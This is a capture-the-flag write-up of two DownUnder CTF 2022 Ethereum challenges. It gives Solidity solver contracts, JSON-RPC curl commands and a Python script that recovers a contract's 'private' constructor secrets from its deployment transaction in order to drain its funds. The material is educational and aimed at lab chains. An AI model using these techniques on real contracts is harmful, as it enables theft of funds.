The Down Under CTF 2022 took place and it included some nice blockchain challenges 
based on ethereum blockchains and solidity smart contracts. 
Although I've learned some solidity and watched some security theory I hadn't ever
used Remix before or deployed a contract on an EVM.

For this challenges we get our instance of a chain. A RPC endpoint. A JSON endpoint
that displays some information like your account, address of the challenge contracts,
and balance. A JSON endpoint that checks if the challenge condition is solved and 
displays flag.


## SolveMe 
### Blockchain - Beginner - 194 solves

We are given this contract, we need to call `solveChallenge()` and since it's external
we can call it from another contract. 

```javascript
pragma solidity ^0.8.0;

/**
 * @title SolveMe
 * @author BlueAlder duc.tf
 */
contract SolveMe {
    bool public isSolved = false;
    
    function solveChallenge() external {
        isSolved = true;
    }
}
```

We create this contract that will call `solveChallenge` on the target contract.

```javascript
pragma solidity ^0.8.0;

interface SolveMe {
    function solveChallenge() external;   
}
contract Test {
    address tg_addr = 0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8;

    constructor() public payable {
        return SolveMe(tg_addr).solveChallenge();
    }   
}
```

To deploy it we need to connect to the chain. 

From Metamask we configure the RPC as the network and import the private key for the account.
We go https://remix.ethereum.org create a new file, paste the script and compile.
On the deploy tab we select Inject Provider and deploy the contract.
When the contract is deployed the `constructor` is called that calls the `solveChallenge`
and we can now visit the solve endpoint to get the flag.

`DUCTF{muM_1_did_a_blonkchain!}`

## Secret and Ephemeral
### Blockchain - Medium - 40 solves


We are given this contract that is deployed with some parameters,
one `secret` string that is saved as private and an int `secret_number`
that is not saved, instead it is hashed with the string and the deployers 
address and this hash is saved as public.

There is also a `retrieveTheFunds` public function that takes 3 parameters, 
the secret, number and address, and checks their hash against the saved one,
if all checks it gives all funds to the caller without checking it is the 
actual owner. That's our win function.

```javascript
pragma solidity ^0.8.0;

/**
 * @title Secret And Ephemeral
 * @author Blue Alder (https://duc.tf)
 **/

contract SecretAndEphemeral {
    address private owner;
    int256 public seconds_in_a_year = 60 * 60 * 24 * 365;
    string word_describing_ductf = "epic";
    string private not_yours;
    mapping(address => uint) public cool_wallet_addresses;

    bytes32 public spooky_hash; //

    constructor(string memory _not_yours, uint256 _secret_number) {
        not_yours = _not_yours;
        spooky_hash = keccak256(abi.encodePacked(not_yours, _secret_number, msg.sender));
    }

    function giveTheFunds() payable public {
        require(msg.value > 0.1 ether);
        // Thankyou for your donation
        cool_wallet_addresses[msg.sender] += msg.value;
    }

    function retrieveTheFunds(string memory secret, uint256 secret_number, address _owner_address) public {
        bytes32 userHash = keccak256(abi.encodePacked(secret, secret_number, _owner_address));

        require(userHash == spooky_hash, "Somethings wrong :(");

        // User authenticated, sending funds
        uint256 balance = address(this).balance;
        payable(msg.sender).transfer(balance);
    }
}

```

We need to retrieve the deploy parameters and this are saved on the transaction right after the bytecode
for the contract. Since this chain was just created for this challenge the contract was probably deployed
in one of the first blocks. We need to compare that transaction data with the contract code.

I set a helper function to call the RPC API.

```bash
export RPC_HOST="https://blockchain-secretandephemeral-030964c73d050caa-eth.2022.ductf.dev/";
alias rpcpost() {
  curl --data-raw $1 -H 'Content-Type: application/json' -X POST $RPC_HOST 
}
```

We get the code from the deployed contract at `0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8`.

```bash
rpcpost '{"jsonrpc":"2.0","method":"eth_getCode","params":["0x6E4198C61C75D1B4D1cbcd00707aAC7d76867cF8","latest"],"id":1}' | jq -r '.result'

0x60806040526004361061004a5760003560e01c80631(...)5ab560caa833f878d167e3c94af9005d6dea322262181580b0f895864736f6c63430008110033
```

We iterate through the first few blocks and transactions searching for when the contract is deployed. 

```bash
for blockn in $(seq 0 10);do
    for txn in $(seq 0 3);do
        rpcpost "{\"jsonrpc\":\"2.0\",\"method\":\"eth_getTransactionByBlockNumberAndIndex\",\"params\":[\"0x$blockn\",\"0x$txn\"],\"id\":1}" | jq -r '{from: .result .from,input: .result .input}'
    done
done

{
  "from": "0x7bcf8a237e5d8900445c148fc2b119670807575b",
  "input": "0x6301e1338060015560c060405260(...)0000000000000000000000000000000000000000000"
}
```
The biggest blob there is probably our contract deployment, we can compare it with the code we got before 
to confirm. The values immediatly after the code is the encoded parameters.

From remix, after setting up the new network in Metamask, we can compile the new contract. 
Then from the deploy tab set the contract address and interact with the contract. 
This way we can get the `spooky_hash`. 


```python
from pwn import *
from eth_abi import *
from web3 import Web3 as w3

contract_owner = w3.toChecksumAddress('0x7bcf8a237e5d8900445c148fc2b119670807575b')
binary_params = '0000000000000000000000000000000000000000000000000000000000000040000000000000000000000000000000000000000000000000000000000dec0ded0000000000000000000000000000000000000000000000000000000000000022736f20616e79776179732069206a757374207374617274656420626c617374696e67000000000000000000000000000000000000000000000000000000000000'
secret_str, secret_number = decode(['string','uint256'],unhex(binary_params))
print(secret_str, secret_number)

hash = w3.solidityKeccak(['string','uint256','address'], [secret_str, secret_number, contract_owner])
print(hash.hex())
```

This hash now should be the same as the spooky_hash and we just call the `retrieveTheFunds` 
function with both secrets and the owner address. We check the solve endpoint.

`DUCTF{u_r_a_web3_t1me_7raveler_:)}`

The next blockchain challenge was Crypto Casino, I wasted all my time trying to exploit a suspected
reentrancy bug on withdraw that never worked and totally ignored the boring and evidently deterministic
`_randomNumber` function. 

It was great to finally get my hand disty with solidity and getting to know the tools.